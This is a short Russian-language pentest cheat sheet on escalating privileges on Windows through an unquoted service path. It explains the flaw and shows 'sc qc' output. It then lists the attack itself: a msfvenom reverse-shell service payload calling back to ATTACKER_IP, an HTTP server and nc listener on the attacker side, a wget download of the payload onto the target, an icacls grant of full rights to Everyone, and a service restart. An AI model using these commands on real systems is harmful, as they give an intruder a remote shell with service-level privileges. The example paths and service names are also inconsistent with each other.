### Уязвимость заключается в том, что путь до бинарного файл сервиса задан без кавычек
D:\Distr\Vuln Software Enterprise\bin\vuln_service2.exe
# из за этого будет запускаться сначала vuln, потом software и только потом нужный сервис, а мы можем сделать свой бинарник vuln, который запустится первым.

# Это применимо лишь к тем исполняемым файлам, которые не размещены в C:\Program Files или C:\Program Files (86), так как к этим директориям у не привилегированных пользователей нет прав на модификацию или запись.

# Смотрим параметры сервиса:
сmd.exe:
sc qc Vuln_service

powershell:
sc.exe qc Vuln_service

* Вывод:
SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe <<< Путь до файла без кавычек
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2


1. Генерируем payload и скачиваем файл на целевой машине
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

Атакующая машина:
python3 -m http.server 8000
nc -lnvp 4445

Целевая машина:
wget http://ATTACKER_IP:8000/rev-svc.exe -O Vuln.exe

2. Даем права файлу 
icacls D:\Distr\Vuln.exe /grant Everyone:F

3. Перезапускаем сервис
sc stop vuln_service
sc start vuln_service